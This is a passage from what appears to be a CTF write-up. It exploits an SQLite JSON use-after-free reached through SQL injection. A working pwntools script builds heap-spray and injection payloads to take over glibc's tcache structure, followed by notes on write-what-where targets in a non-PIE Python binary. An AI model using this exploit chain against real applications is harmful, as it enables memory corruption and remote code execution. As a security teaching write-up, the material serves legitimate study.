<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token keyword" style="color:hsl(301, 63%, 40%)">from</span><span class="token plain"> pwn </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">import</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">*</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">import</span><span class="token plain"> string</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">request2size </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">lambda</span><span class="token plain"> req</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">req</span><span class="token operator" style="color:hsl(221, 87%, 60%)">+</span><span class="token number" style="color:hsl(35, 99%, 36%)">0x17</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&amp;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token operator" style="color:hsl(221, 87%, 60%)">~</span><span class="token number" style="color:hsl(35, 99%, 36%)">0xf</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">if</span><span class="token plain"> req</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;=</span><span class="token number" style="color:hsl(35, 99%, 36%)">9</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">else</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0x20</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">size2usable </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">lambda</span><span class="token plain"> sz</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> sz</span><span class="token operator" style="color:hsl(221, 87%, 60%)">-</span><span class="token number" style="color:hsl(35, 99%, 36%)">8</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">escape_byte</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">c</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> force</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token boolean" style="color:hsl(35, 99%, 36%)">False</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	charset </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">set</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">string</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">printable</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">encode</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	charset </span><span class="token operator" style="color:hsl(221, 87%, 60%)">-=</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">set</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">string</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">whitespace</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">encode</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">+</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">b&quot;&#x27;\&quot;&quot;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token keyword" style="color:hsl(301, 63%, 40%)">if</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">not</span><span class="token plain"> force</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">		</span><span class="token keyword" style="color:hsl(301, 63%, 40%)">if</span><span class="token plain"> c </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">			</span><span class="token keyword" style="color:hsl(301, 63%, 40%)">return</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;\\0&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">		</span><span class="token keyword" style="color:hsl(301, 63%, 40%)">elif</span><span class="token plain"> c </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">in</span><span class="token plain"> charset</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">			</span><span class="token keyword" style="color:hsl(301, 63%, 40%)">return</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">chr</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">c</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token keyword" style="color:hsl(301, 63%, 40%)">return</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;\\x&quot;</span><span class="token operator" style="color:hsl(221, 87%, 60%)">+</span><span class="token builtin" style="color:hsl(119, 34%, 47%)">format</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">c</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;02x&quot;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">escape</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">x</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token keyword" style="color:hsl(301, 63%, 40%)">return</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;&quot;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">join</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token builtin" style="color:hsl(119, 34%, 47%)">map</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">escape_byte</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> x</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">malloc_escaped</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">escaped</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token comment" style="color:hsl(230, 4%, 64%)"># at least one character should be escaped to trigger the malloc</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token keyword" style="color:hsl(301, 63%, 40%)">assert</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;\\&quot;</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">in</span><span class="token plain"> escaped</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token keyword" style="color:hsl(301, 63%, 40%)">return</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;SELECT json_extract(&#x27;{a:\&quot;%s\&quot;}&#x27;, &#x27;$.a&#x27;)&quot;</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">%</span><span class="token plain"> escaped</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">spray</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">size</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> char</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;A&quot;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token keyword" style="color:hsl(301, 63%, 40%)">assert</span><span class="token plain"> size </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&amp;</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0xf</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	x </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> escape_byte</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token builtin" style="color:hsl(119, 34%, 47%)">ord</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">char</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> force</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token boolean" style="color:hsl(35, 99%, 36%)">True</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	x </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> x</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">ljust</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">size2usable</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">size</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token operator" style="color:hsl(221, 87%, 60%)">-</span><span class="token number" style="color:hsl(35, 99%, 36%)">2</span><span class="token operator" style="color:hsl(221, 87%, 60%)">-</span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> char</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token keyword" style="color:hsl(301, 63%, 40%)">return</span><span class="token plain"> malloc_escaped</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">x</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># use json_extract with escaped strings to spray</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">to_spray </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token number" style="color:hsl(35, 99%, 36%)">0x60</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">7</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token number" style="color:hsl(35, 99%, 36%)">0x290</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">7</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sprays </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">char </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0x41</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">for</span><span class="token plain"> size</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> count </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">in</span><span class="token plain"> to_spray</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token keyword" style="color:hsl(301, 63%, 40%)">for</span><span class="token plain"> _ </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">in</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">range</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">count</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">		sprays</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">append</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">spray</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">size</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> char</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token builtin" style="color:hsl(119, 34%, 47%)">chr</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">char</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">		char </span><span class="token operator" style="color:hsl(221, 87%, 60%)">+=</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">malloc_tcache </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> spray</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token number" style="color:hsl(35, 99%, 36%)">0x290</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> char</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;X&quot;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">long_list </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;[&quot;</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">+</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;,&quot;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">join</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;null&quot;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token operator" style="color:hsl(221, 87%, 60%)">*</span><span class="token number" style="color:hsl(35, 99%, 36%)">0x30</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">+</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;]&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">json </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f&quot;json_set(&#x27;{{}}&#x27;, &#x27;$.a&#x27;, json(&#x27;1&#x27;), &#x27;$.b&#x27;, json(&#x27;2&#x27;), &#x27;$.c&#x27;, json(&#x27;3&#x27;), &#x27;$.d&#x27;, json(&#x27;</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">long_list</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">&#x27;))&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">statements </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">statements</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">extend</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">sprays</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">statements</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">append</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;SELECT &quot;</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">+</span><span class="token plain"> json</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">statements</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">append</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">malloc_tcache</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">injection </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot; UNION &quot;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">join</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;aaaa&#x27;)&quot;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">+</span><span class="token plain"> statements</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">+</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;--&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">injection</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">statement </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f&quot;INSERT INTO messages (message) VALUES (&#x27;</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">injection</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">&#x27;)&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f&quot;db.cursor().execute(</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation builtin" style="color:hsl(119, 34%, 47%)">repr</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation interpolation">statement</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">)&quot;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><br></span></code></pre></div></div>
<p>We start off by spraying chunks to empty:</p>
<ul>
<li><code>tcachebins[0x60]</code>: This will be used for the UAF&#x27;ed chunk, so we need <code>fd</code> to be <code>NULL</code>.</li>
<li><code>tcachebins[0x290]</code>: Ensure that when we free <code>tcache_perthread_struct</code>, it gets freed to tcache, which makes it easier to reallocate. We don&#x27;t <em>need</em> to fully empty it (1 slot would work just fine), but we might as well, just to be sure we&#x27;ll get a slot (plus nothing&#x27;s stopping us).</li>
</ul>
<p>Then we trigger the UAF using a modified version of the test case. The change is that we use a list longer than 0x29 elements, to ensure that its <code>aNode</code> array is bigger than 0x290 bytes (<code>sizeof(JsonNode)=0x10</code>), which forces <code>realloc</code> to free <code>tcache_perthread_struct</code>.</p>
<p>Finally we reclaim the allocation with a dummy.</p>
<p>We can test this as follows:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">ctf@0ac532cec93d:/app$ python3</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Python 3.8.10 (default, Mar 25 2024, 10:42:49) </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">[GCC 9.4.0] on linux</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">&gt;&gt;&gt; import sqlite3</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">&gt;&gt;&gt; db = sqlite3.connect(&quot;chat.db&quot;)</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">&gt;&gt;&gt; db.cursor().execute(...)</span><br></span></code></pre></div></div>
<figure><img src="/assets/image (191).png" alt=""><figcaption><p><code>tcache</code> after allocation</p></figcaption></figure>
<p>Bingo!</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="write-what-where">Write what where<a href="#write-what-where" class="hash-link" aria-label="Direct link to Write what where" title="Direct link to Write what where">​</a></h3>
<p>Now that we have control over <code>tcache_perthread_struct</code>, what can we do with that? ASLR is in place, and turning this into a leak wouldn&#x27;t be possible, so is there anything we can target? Yes there is, because thankfully the <code>python</code> binary is compiled without <code>PIE</code>:</p>
<figure><img src="/assets/image (192).png" alt=""><figcaption><p><code>pwn checksec python3.8</code></p></figcaption></figure>
<p>So what can we target here?</p>
<p>Well one idea that I had was targetting the GOT, but this doesn&#x27;t work for a very annoying reason: <a href="https://github.com/sqlite/sqlite/blob/66dacae4c3f818d0a9e94ecb4433c823a69a98aa/src/malloc.c#L318" target="_blank" rel="noopener noreferrer">sqlite3_malloc</a>. This is a wrapper around <code>malloc</code> that does some locking and memory tracking. Part of that memory tracking is counting how many total bytes have been malloc&#x27;ed, and to do this it uses <code>malloc_usable_size</code>.</p>
<figure><img src="/assets/image (193).png" alt=""><figcaption><p><a href="https://github.com/sqlite/sqlite/blob/66dacae4c3f818d0a9e94ecb4433c823a69a98aa/src/malloc.c#L265">mallocWithAlarm</a></p></figcaption></figure>
<p>So with our allocations we have to be careful: if we use a size that&#x27;s too big (like an address) we&#x27;ll get a crash, because part of determining the usable size is finding whether the next chunk&#x27;s <code>prev_inuse</code> bit is set, so finding the next chunk based on a large size wanders into no man&#x27;s land.</p>
<p>So <code>GOT</code> is a no-go. I also considered possibly targetting a python class method. When a class method is called, it&#x27;s typically done so with the first argument being the object itself (like a <code>thiscall</code>). So if we could write a command to the start of the object, then overwrite a class method to <code>system@plt</code>, we could get RCE. I didn&#x27;t find a way to do this, especially since most objects are on the heap, which we can&#x27;t access. And while there some objects we can access in <code>_PyRuntime</code>, it&#x27;s still not ideal because we need to use a reverse shell command, which we can&#x27;t fit inside 8 bytes (at offset <code>+0x08</code> is the pointer to the class object).</p>
